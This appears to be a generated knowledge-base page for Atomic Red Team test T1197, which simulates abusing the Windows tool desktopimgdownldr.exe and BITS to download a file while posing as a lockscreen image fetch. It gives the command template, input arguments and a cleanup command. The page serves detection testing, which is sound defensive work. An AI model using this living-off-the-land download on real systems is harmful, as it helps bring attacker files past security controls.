---
atomic_guid: "afb5e09e-e385-4dee-9a94-6ee60979d114"
title: "Bits download using desktopimgdownldr.exe (cmd)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1197"
attack_technique_name: "BITS Jobs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "afb5e09e-e385-4dee-9a94-6ee60979d114"
  - "Bits download using desktopimgdownldr.exe (cmd)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bits download using desktopimgdownldr.exe (cmd)

This test simulates using desktopimgdownldr.exe to download a malicious file
instead of a desktop or lockscreen background img. The process that actually makes 
the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) 
and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

## Metadata

- Atomic GUID: afb5e09e-e385-4dee-9a94-6ee60979d114
- Technique: T1197: BITS Jobs
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1197/T1197.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1197-bits_jobs|T1197]]

## Input Arguments

### cleanup_file

- description: file to remove as part of cleanup_command
- type: string
- default: *.md

### cleanup_path

- description: path to delete file as part of cleanup_command
- type: path
- default: C:\Windows\Temp\Personalization\LockScreenImage

### download_path

- description: Local file path to save downloaded file
- type: path
- default: SYSTEMROOT=C:\Windows\Temp

### remote_file

- description: Remote file to download
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md

## Executor

- name: command_prompt

### Command

```cmd
set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
```

### Cleanup

```cmd
del #{cleanup_path}\#{cleanup_file} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.yaml)
